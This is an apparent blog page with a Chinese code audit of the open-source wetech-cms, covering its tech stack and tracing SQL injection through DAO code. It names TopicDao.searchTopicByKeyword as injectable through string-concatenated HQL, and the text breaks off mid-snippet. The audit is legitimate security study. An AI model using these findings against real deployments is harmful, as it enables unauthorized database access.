@@ -1,0 +1,868 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="GitHub地址-https://github.com/cjbi/wetech-cms"><title>wetech-cms</title>
+<link rel=canonical href=https://hadagaga.github.io/p/wetech-cms/><link rel=stylesheet href=/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css><meta property='og:title' content="wetech-cms"><meta property='og:description' content="GitHub地址-https://github.com/cjbi/wetech-cms"><meta property='og:url' content='https://hadagaga.github.io/p/wetech-cms/'><meta property='og:site_name' content='hadagaga blog'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Code Audit'><meta property='article:published_time' content='2024-11-28T00:00:00+00:00'><meta property='article:modified_time' content='2024-11-28T00:00:00+00:00'><meta property='og:image' content='https://hadagaga.github.io/p/wetech-cms/cover.png'><meta name=twitter:title content="wetech-cms"><meta name=twitter:description content="GitHub地址-https://github.com/cjbi/wetech-cms"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://hadagaga.github.io/p/wetech-cms/cover.png'><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu6187617985535410037.png width=300 height=286 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>hadagaga blog</a></h1><h2 class=site-description>没有做不到的事，只有不想做的事。</h2></div></header><ol class=menu-social><li><a href=https://github.com/hadagaga target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#项目技术栈>项目技术栈</a><ol><li><a href=#后端技术>后端技术</a></li><li><a href=#前端技术>前端技术</a></li></ol></li><li><a href=#项目依赖审计>项目依赖审计</a></li><li><a href=#单点漏洞审计>单点漏洞审计</a><ol><li><a href=#sql注入>SQL注入</a><ol><li><a href=#srcmainjavatechwetechbasicdaobasedaojava失败>src/main/java/tech/wetech/basic/dao/BaseDao.java(失败)</a></li><li><a href=#srcmainjavatechwetechcmsdaochanneldaojava失败>src/main/java/tech/wetech/cms/dao/ChannelDao.java(失败)</a></li><li><a href=#srcmainjavatechwetechcmsdaotopicdaojava成功>src/main/java/tech/wetech/cms/dao/TopicDao.java(成功)</a></li><li><a href=#srcmainjavatechwetechcmsdaouserdaojava成功>src/main/java/tech/wetech/cms/dao/UserDao.java(成功)</a></li></ol></li><li><a href=#任意文件操控读取修改等>任意文件操控（读取，修改等）</a><ol><li><a href=#srcmainjavatechwetechcmscontrollertopiccontrollerjava失败>src/main/java/tech/wetech/cms/controller/TopicController.java(失败)</a></li></ol></li><li><a href=#目录穿透>目录穿透</a><ol><li><a href=#srcmainjavatechwetechbasicutilmysqlutiljava成功>src/main/java/tech/wetech/basic/util/MySQLUtil.java(成功)</a></li></ol></li></ol></li><li><a href=#前端渗透测试>前端渗透测试</a><ol><li><a href=#xss>XSS</a></li><li><a href=#csrf>CSRF</a></li><li><a href=#csrfxss>CSRF+XSS</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/wetech-cms/><img src=/p/wetech-cms/cover_hu9969144002383854006.png srcset="/p/wetech-cms/cover_hu9969144002383854006.png 800w, /p/wetech-cms/cover_hu8567506643595441552.png 1600w" width=800 height=274 loading=lazy alt="Featured image of post wetech-cms"></a></div><div class=article-details><header class=article-category><a href=/categories/cate2/ style=background-color:#2a9d8f;color:#fff>代码审计记录</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/wetech-cms/>wetech-cms</a></h2><h3 class=article-subtitle>GitHub地址-https://github.com/cjbi/wetech-cms</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Nov 28, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>11 minute read</time></div></footer></div></header><section class=article-content><h2 id=项目技术栈>项目技术栈</h2><h3 id=后端技术>后端技术</h3><div class=table-wrapper><table><thead><tr><th>技术</th><th>名称</th><th>版本</th><th>官网</th></tr></thead><tbody><tr><td>Spring Framework</td><td>容器</td><td>4.3.5.RELEASE</td><td><a class=link href=http://projects.spring.io/spring-framework/ target=_blank rel=noopener>http://projects.spring.io/spring-framework/</a></td></tr><tr><td>SpringMVC</td><td>MVC框架</td><td>4.3.5.RELEASE</td><td><a class=link href=http://docs.spring.io/spring/docs/current/spring-framework-reference/htmlsingle/#mvc target=_blank rel=noopener>http://docs.spring.io/spring/docs/current/spring-framework-reference/htmlsingle/#mvc</a></td></tr><tr><td>Hibernate</td><td>ORM框架</td><td>4.2.0.Final</td><td><a class=link href=http://hibernate.org/ target=_blank rel=noopener>http://hibernate.org/</a></td></tr><tr><td>Maven</td><td>项目构建管理</td><td>4.0.0</td><td><a class=link href=http://maven.apache.org/ target=_blank rel=noopener>http://maven.apache.org</a></td></tr><tr><td>Freemarker</td><td>模板引擎</td><td>2.3.23</td><td><a class=link href=https://freemarker.apache.org/ target=_blank rel=noopener>https://freemarker.apache.org/</a></td></tr><tr><td>Logback</td><td>日志组件</td><td>1.1.3</td><td><a class=link href=https://logback.qos.ch/ target=_blank rel=noopener>https://logback.qos.ch</a></td></tr><tr><td>Dbcp2</td><td>数据库连接池</td><td>2.1.1</td><td><a class=link href=https://github.com/alibaba/druid target=_blank rel=noopener>https://github.com/alibaba/druid</a></td></tr><tr><td>Hibernate Validator</td><td>后端校验框架</td><td>5.4.2.Final</td><td><a class=link href=http://hibernate.org/validator/ target=_blank rel=noopener>http://hibernate.org/validator/</a></td></tr><tr><td>DWR</td><td>WEB远程调用框架</td><td>3.0.1-RELEASE</td><td><a class=link href=http://directwebremoting.org/dwr/index.html target=_blank rel=noopener>http://directwebremoting.org/dwr/index.html</a></td></tr><tr><td>Thumbnailator</td><td>生成高质量缩略图的Java类库</td><td>0.4.3</td><td><a class=link href=https://github.com/coobird/thumbnailator target=_blank rel=noopener>https://github.com/coobird/thumbnailator</a></td></tr></tbody></table></div><h3 id=前端技术>前端技术</h3><div class=table-wrapper><table><thead><tr><th>技术</th><th>名称</th><th>版本</th><th>官网</th></tr></thead><tbody><tr><td>jQuery</td><td>优秀的Javascript库</td><td>3.1.1</td><td><a class=link href=http://jquery.com/ target=_blank rel=noopener>http://jquery.com/</a></td></tr><tr><td>Amaze UI</td><td>前端框架</td><td>2.7.2</td><td><a class=link href=http://amazeui.org/ target=_blank rel=noopener>http://amazeui.org/</a></td></tr><tr><td>DataTables</td><td>数据表格</td><td>1.10.16</td><td><a class=link href=https://www.datatables.net/ target=_blank rel=noopener>https://www.datatables.net/</a></td></tr><tr><td>Layer</td><td>jQuery弹出层插件</td><td>3.0.1</td><td><a class=link href=http://layer.layui.com/ target=_blank rel=noopener>http://layer.layui.com/</a></td></tr><tr><td>ZTree</td><td>jQuery树插件</td><td>3.5.12</td><td><a class=link href=http://www.treejs.cn/ target=_blank rel=noopener>http://www.treejs.cn</a></td></tr><tr><td>WangEditor</td><td>轻量级web富文本编辑器</td><td>2.1.22</td><td><a class=link href=http://www.wangeditor.com/ target=_blank rel=noopener>http://www.wangeditor.com/</a></td></tr></tbody></table></div><h2 id=项目依赖审计>项目依赖审计</h2><p>​ 项目依赖中的已披露漏洞均不存在利用条件</p><h2 id=单点漏洞审计>单点漏洞审计</h2><h3 id=sql注入>SQL注入</h3><p>​ 由于后端数据库交互使用的不是mybatis，所以我们搜索$找不到注入点，但是我们可以尝试寻找动态拼接。</p><p>​ 搜索select</p><h4 id=srcmainjavatechwetechbasicdaobasedaojava失败>src/main/java/tech/wetech/basic/dao/BaseDao.java(失败)</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>private</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>getCountHql</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>queryString</span><span class=p>,</span><span class=kt>boolean</span><span class=w> </span><span class=n>isHql</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>e</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>queryString</span><span class=p>.</span><span class=na>substring</span><span class=p>(</span><span class=n>queryString</span><span class=p>.</span><span class=na>indexOf</span><span class=p>(</span><span class=s>&#34;from&#34;</span><span class=p>));</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>c</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;select count(*) &#34;</span><span class=o>+</span><span class=n>e</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=p>(</span><span class=n>isHql</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>c</span><span class=p>.</span><span class=na>replaceAll</span><span class=p>(</span><span class=s>&#34;fetch&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=n>c</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 该查询语句使用了动态拼接，e的字符串是以传入的SQL语句中的第一个from为索引进行分割，之后拼接进查询语句中。同时这里代码有个判断，如果是true就会把查询语句中的fetch删除，查找方法调用也发现有两个调用方式，一个为true，一个false，我们先追溯第一个传入true的情况。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=n>Pager</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=nf>find</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>hql</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>,</span><span class=w> </span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>alias</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>hql</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>initSort</span><span class=p>(</span><span class=n>hql</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>cq</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getCountHql</span><span class=p>(</span><span class=n>hql</span><span class=p>,</span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=err>···</span><span class=n>代码省略</span><span class=err>···</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>private</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>initSort</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>hql</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>order</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>SystemContext</span><span class=p>.</span><span class=na>getOrder</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>sort</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>SystemContext</span><span class=p>.</span><span class=na>getSort</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=p>(</span><span class=n>sort</span><span class=o>!=</span><span class=kc>null</span><span class=o>&amp;&amp;!</span><span class=s>&#34;&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>sort</span><span class=p>.</span><span class=na>trim</span><span class=p>()))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>hql</span><span class=o>+=</span><span class=s>&#34; order by &#34;</span><span class=o>+</span><span class=n>sort</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=s>&#34;desc&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>order</span><span class=p>))</span><span class=w> </span><span class=n>hql</span><span class=o>+=</span><span class=s>&#34; asc&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>else</span><span class=w> </span><span class=n>hql</span><span class=o>+=</span><span class=s>&#34; desc&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=n>hql</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 这个函数只是在创建查询语句的排序，继续跟踪find。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=nd>@Override</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>Pager</span><span class=o>&lt;</span><span class=n>Attachment</span><span class=o>&gt;</span><span class=w> </span><span class=nf>findChannelPic</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>cid</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>hql</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getAttachmentSelect</span><span class=p>()</span><span class=o>+</span><span class=s>&#34; from Attachment a where a.topic.status=1 and&#34;</span><span class=w> </span><span class=o>+</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=s>&#34; a.topic.channel.id=? and a.id=a.topic.channelPicId&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>find</span><span class=p>(</span><span class=n>hql</span><span class=p>,</span><span class=w> </span><span class=n>cid</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 跟踪到这个位置发现，这里传入的参数是一个整形，无法拼接SQL语句，而且还使用了预处理语句，因此该功能不存在SQL注入。</p><p>​ 而另一个传入false的调用则是直接使用的固定SQL语句，无法进行SQL注入。</p><h4 id=srcmainjavatechwetechcmsdaochanneldaojava失败>src/main/java/tech/wetech/cms/dao/ChannelDao.java(失败)</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=nd>@Override</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>List</span><span class=o>&lt;</span><span class=n>Channel</span><span class=o>&gt;</span><span class=w> </span><span class=nf>listByParent</span><span class=p>(</span><span class=n>Integer</span><span class=w> </span><span class=n>pid</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>hql</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;select c from Channel c left join fetch c.parent cp where cp.id=&#34;</span><span class=o>+</span><span class=n>pid</span><span class=o>+</span><span class=s>&#34; order by c.orders&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=p>(</span><span class=n>pid</span><span class=o>==</span><span class=kc>null</span><span class=o>||</span><span class=n>pid</span><span class=o>==</span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=n>hql</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;select c from Channel c where c.parent is null order by c.orders&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>list</span><span class=p>(</span><span class=n>hql</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=nd>@Override</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=nf>getMaxOrderByParent</span><span class=p>(</span><span class=n>Integer</span><span class=w> </span><span class=n>pid</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>hql</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;select max(c.orders) from Channel c where c.parent.id=&#34;</span><span class=o>+</span><span class=n>pid</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=p>(</span><span class=n>pid</span><span class=o>==</span><span class=kc>null</span><span class=o>||</span><span class=n>pid</span><span class=o>==</span><span class=n>0</span><span class=p>)</span><span class=w> </span><span class=n>hql</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;select max(c.orders) from Channel c where c.parent is null&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>queryObject</span><span class=p>(</span><span class=n>hql</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=p>(</span><span class=n>obj</span><span class=o>==</span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=k>return</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=p>(</span><span class=n>Integer</span><span class=p>)</span><span class=n>obj</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 这几个都是同样的原因，虽然使用了动态拼接，但是由于传入参数为整形，无法拼接SQL语句，所以直接pass。</p><h4 id=srcmainjavatechwetechcmsdaotopicdaojava成功>src/main/java/tech/wetech/cms/dao/TopicDao.java(成功)</h4><h5 id=第47行-searchtopicbykeyword>第47行-searchTopicByKeyword：</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=nd>@Override</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>Pager</span><span class=o>&lt;</span><span class=n>Topic</span><span class=o>&gt;</span><span class=w> </span><span class=nf>searchTopicByKeyword</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>keyword</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>hql</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getTopicSelect</span><span class=p>()</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34; from Topic t where t.status=1 and t.keyword like &#39;%&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>keyword</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;%&#39;&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>find</span><span class=p>(</span><span class=n>hql</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 我们跟踪一下find方法，看看是否有过滤</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>public</span><span class=w> </span><span class=n>Pager</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=nf>find</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>hql</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>,</span><span class=w> </span><span class=n>Map</span><span class=o>&lt;</span><span class=n>String</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=o>&gt;</span><span class=w> </span><span class=n>alias</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>hql</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>initSort</span><span class=p>(</span><span class=n>hql</span><span class=p>);</span><span class=w>
